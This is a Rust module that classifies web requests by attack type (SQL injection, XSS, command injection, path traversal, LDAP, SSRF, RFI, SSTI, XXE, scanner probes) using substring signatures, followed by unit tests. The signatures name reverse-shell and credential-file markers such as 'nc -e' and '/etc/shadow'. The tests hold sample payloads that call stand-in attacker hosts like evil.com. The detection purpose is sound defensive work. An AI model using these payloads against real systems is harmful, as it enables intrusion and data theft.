//! Classifies the attack vector from the request contents (URI + body).
//! Returns a vector code (sqli/xss/lfi/...); mapping to an OWASP category happens in the UI.
//! Substring signature heuristics, no regex dependency. Cheap.

/// UTF-8 safe truncation of a string to n characters.
pub fn truncate_chars(s: &str, n: usize) -> String {
    match s.char_indices().nth(n) {
        Some((i, _)) => s[..i].to_string(),
        None => s.to_string(),
    }
}

/// Attack vector code, or "" when no known signature matched.
pub fn classify(uri: &str, body: &str) -> &'static str {
    let mut h = String::with_capacity(uri.len() + body.len() + 1);
    h.push_str(uri);
    h.push(' ');
    h.push_str(body);
    let s = h.to_ascii_lowercase();
    let s = s.as_str();

    // SQLi
    if s.contains("union select") || s.contains("union all select")
        || s.contains("' or '1'='1") || s.contains("\" or \"1\"=\"1")
        || s.contains(" or 1=1") || s.contains("or 1=1--")
        || s.contains("' and '1'='1") || s.contains("information_schema")
        || s.contains("sleep(") || s.contains("benchmark(") || s.contains("pg_sleep")
        || s.contains("waitfor delay") || s.contains("'; drop") || s.contains("; drop table")
    {
        return "sqli";
    }
    // XSS
    if s.contains("<script") || s.contains("</script>") || s.contains("javascript:")
        || s.contains("onerror=") || s.contains("onload=") || s.contains("onmouseover=")
        || s.contains("<svg") || s.contains("<iframe") || s.contains("document.cookie")
        || s.contains("alert(") || (s.contains("<img") && s.contains("=alert"))
    {
        return "xss";
    }
    // Command injection / RCE (previously classed as lfi: ";cat /etc/passwd" is injection, not mere traversal)
    if s.contains(";cat ") || s.contains("; cat ") || s.contains("|cat ")
        || s.contains("$(") || s.contains("`id`") || s.contains(";id")
        || s.contains("&&id") || s.contains("/bin/sh") || s.contains("/bin/bash")
        || s.contains("nc -e") || s.contains("; ls") || s.contains("|sh")
    {
        return "cmdi";
    }
    // Path traversal / LFI
    if s.contains("../") || s.contains("..\\") || s.contains("%2e%2e%2f")
        || s.contains("%2e%2e/") || s.contains("..%2f")
        || s.contains("/etc/passwd") || s.contains("/etc/shadow")
        || s.contains("boot.ini") || s.contains("php://filter") || s.contains("file://")
    {
        return "lfi";
    }
    // LDAP injection (OWASP WSTG-INPV-06): injection into an LDAP filter.
    // Well-known patterns (closing paren plus a new predicate, or wildcard bypasses).
    if s.contains(")(uid=") || s.contains(")(cn=") || s.contains(")(|(") || s.contains(")(&(")
        || s.contains(")(objectclass=") || s.contains("*)(uid=") || s.contains(")(mail=")
        || s.contains("*))%00") || s.contains("admin)(&")
    {
        return "ldap";
    }
    // SSRF
    if s.contains("169.254.169.254") || s.contains("metadata.google")
        || s.contains("http://localhost") || s.contains("http://127.0.0.1")
        || s.contains("gopher://") || s.contains("dict://")
    {
        return "ssrf";
    }
    // RFI
    if (s.contains("=http://") || s.contains("=https://") || s.contains("=ftp://"))
        && (s.contains("include") || s.contains("page=") || s.contains("file=") || s.contains("url="))
    {
        return "rfi";
    }
    // SSTI
    if (s.contains("{{") && s.contains("}}")) || (s.contains("${") && s.contains('}'))
        || s.contains("<%=") || s.contains("#{")
    {
        return "ssti";
    }
    // XXE
    if s.contains("<!entity") || (s.contains("<!doctype") && s.contains("system")) {
        return "xxe";
    }
    // Scanner / recon
    if s.contains("/.env") || s.contains("/.git") || s.contains("/wp-admin")
        || s.contains("/phpmyadmin") || s.contains("/.aws") || s.contains("/.ssh")
        || s.contains("/actuator") || s.contains("sqlmap") || s.contains("nikto")
    {
        return "scanner";
    }

    ""
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn classify_each_vector() {
        assert_eq!(classify("/s?q=union select * from users", ""), "sqli");
        assert_eq!(classify("/?x=<script>alert(1)</script>", ""), "xss");
        assert_eq!(classify("/?f=../../etc/passwd", ""), "lfi");
        assert_eq!(classify("/?u=admin)(&", ""), "ldap");
        assert_eq!(classify("/fetch?url=http://169.254.169.254/", ""), "ssrf");
        assert_eq!(classify("/?tpl={{7*7}}", ""), "ssti");
        assert_eq!(classify("", r#"<!ENTITY x SYSTEM "http://evil.example/x">"#), "xxe");
        assert_eq!(classify("/.env", ""), "scanner");
    }

    #[test]
    fn classify_rfi_needs_scheme_and_param() {
        // RFI: remote scheme plus an include-like parameter
        assert_eq!(classify("/?page=http://evil.com/shell.txt", ""), "rfi");
        // a bare link without an include parameter is not RFI
        assert_ne!(classify("/redirect?to=http://example.com", ""), "rfi");
    }

    #[test]
    fn classify_precedence_cmdi_before_lfi() {
        // ";cat /etc/passwd" carries both cmdi and lfi markers -> must classify as cmdi (injection wins)
        assert_eq!(classify("/?x=;cat /etc/passwd", ""), "cmdi");
    }

    #[test]
    fn classify_benign_is_empty() {
        assert_eq!(classify("/api/v1/users?page=2", "{\"name\":\"alice\"}"), "");
        assert_eq!(classify("/products/shoes", ""), "");
    }

    #[test]
    fn truncate_chars_is_utf8_safe() {
        assert_eq!(truncate_chars("hello", 3), "hel");
        assert_eq!(truncate_chars("hi", 5), "hi");           // shorter than the limit
        assert_eq!(truncate_chars("héllo", 2), "hé");        // boundary falls inside a multi-byte character
        assert_eq!(truncate_chars("", 3), "");
    }
}
